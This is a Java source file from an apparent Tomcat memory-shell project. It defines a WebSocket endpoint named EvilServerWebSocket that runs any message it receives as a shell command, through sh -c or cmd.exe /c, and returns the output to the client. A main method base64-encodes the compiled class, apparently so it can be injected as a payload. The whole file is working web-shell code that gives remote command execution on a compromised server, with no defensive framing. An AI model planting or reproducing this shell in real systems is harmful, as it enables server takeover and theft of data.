package org.example.tomcatmemshell.WebSocket;

import javax.websocket.Endpoint;
import javax.websocket.EndpointConfig;
import javax.websocket.MessageHandler;
import javax.websocket.Session;
import java.io.IOException;
import java.io.InputStream;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;

public class EvilServerWebSocket extends Endpoint implements MessageHandler.Whole<String> {
    public static void main(String[] args) throws IOException {
        byte[] string = Base64.getEncoder().encode(Files.readAllBytes(Paths.get("target/classes/org/example/tomcatmemshell/WebSocket/EvilServerWebSocket.class")));
        System.out.println(new String(string));
    }
    private Session session;
    @Override
    public void onOpen(Session session, EndpointConfig config) {
        this.session = session;
        this.session.addMessageHandler(this);
    }
    @Override
    public void onMessage(String message) {
        try {
            Process process;
            String[] cmds = !System.getProperty("os.name").toLowerCase().contains("win") ? new String[]{"sh", "-c", message} : new String[]{"cmd.exe", "/c", message};
            process = Runtime.getRuntime().exec(cmds);
            InputStream inputStream = process.getInputStream();
            StringBuilder stringBuilder = new StringBuilder();
            int i;
            while ((i = inputStream.read()) != -1)
                stringBuilder.append((char)i);
            inputStream.close();
            process.waitFor();
            session.getBasicRemote().sendText(stringBuilder.toString());
        } catch (IOException e) {
            e.printStackTrace();
        } catch (InterruptedException e) {
            throw new RuntimeException(e);
        }
    }
}
